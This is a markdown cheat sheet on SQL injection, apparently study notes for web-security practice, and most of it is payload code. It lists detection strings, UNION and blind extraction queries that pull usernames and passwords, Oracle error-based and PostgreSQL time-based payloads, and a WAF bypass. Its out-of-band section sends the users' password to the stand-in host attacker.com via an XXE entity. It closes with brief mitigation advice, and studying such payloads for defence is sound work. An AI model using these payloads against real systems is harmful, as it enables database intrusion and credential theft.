# 💉 SQL Injection (SQLi)

## 🧠 What is SQL Injection?

SQL Injection is a vulnerability that allows an attacker to manipulate database queries by injecting malicious SQL input.

It occurs when user input is not properly validated or sanitized.

---

## 🔥 Impact

* Read sensitive data (usernames, passwords)
* Bypass authentication
* Modify or delete data
* Gain full database access

---

## 🧩 Types of SQL Injection

### 1. UNION-Based SQLi

Used to retrieve data from other tables.

### 2. Error-Based SQLi

Uses database errors to extract information.

### 3. Blind SQLi

* Boolean-based (true/false responses)
* Time-based (delays)

### 4. Out-of-Band SQLi (OAST)

Data is exfiltrated via external servers (DNS/HTTP).

---

## 🔍 How to Detect SQLi

```sql
' OR 1=1--
' AND 1=2--
'
```

Observe:

* Errors
* Different responses
* Delays

---

## 🧪 UNION-Based SQLi

### Find number of columns

```sql
' ORDER BY 1--
' ORDER BY 2--
```

### Extract table names

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### Extract column names

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Extract data

```sql
' UNION SELECT username,password FROM users--
```

---

## 🧪 Oracle Database Enumeration

```sql
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name='USERS'
```

```sql
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

---

## 🧠 Blind SQL Injection (Boolean-Based)

### Confirm SQLi

```sql
' AND 1=1--
' AND 1=0--
```

### Check table existence

```sql
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

### Check user existence

```sql
' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```

### Extract password length

```sql
' AND LENGTH(password)>1--
```

### Extract password character

```sql
' AND SUBSTRING(password,1,1)='a'--
```

---

## 🧪 Error-Based Blind SQLi (Oracle)

```sql
' || (select '' from dual) ||'
```

### Trigger error condition

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users) ||'
```

---

## ⏱️ Time-Based SQLi

### PostgreSQL

```sql
' || (SELECT pg_sleep(10))--
```

### Conditional delay

```sql
' || (SELECT CASE WHEN condition THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```

---

## 🌐 Out-of-Band (OAST)

### Trigger external interaction (Oracle)

```sql
' || (SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/"> %remote;]>'),'/l') FROM dual)--
```

### Data exfiltration

```sql
' || (SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users)||'.attacker.com/"> %remote;]>'),'/l') FROM dual)--
```

---

## 🛡️ WAF Bypass

```sql
1 UNION SELECT username || '~' || password FROM users
```

---

## 💥 Error-Based Extraction

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

---

## 🛡️ Mitigation

* Use prepared statements (parameterized queries)
* Avoid dynamic SQL queries
* Validate and sanitize inputs
* Use least privilege for database users
* Implement proper error handling

---

## 🧠 Key Insight

SQL Injection is not just about payloads.

👉 It’s about understanding how queries are built and breaking that logic.
